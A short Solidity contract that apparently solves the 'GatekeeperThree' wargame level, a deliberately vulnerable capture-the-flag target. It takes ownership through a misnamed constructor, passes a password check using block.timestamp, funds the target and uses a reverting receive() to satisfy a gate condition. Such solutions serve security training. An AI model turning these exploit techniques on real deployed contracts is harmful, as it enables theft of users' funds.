// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract GatekeeperThreeAttack {
    GatekeeperThree g;
    constructor(address payable target) {
        g = GatekeeperThree(target);
    }
    
    function attack() public payable {
        g.construct0r();
        g.createTrick();
        g.getAllowance(block.timestamp);
        payable(g).transfer(address(this).balance);
        g.enter();
    }

    receive() external payable {
        revert();
    }
}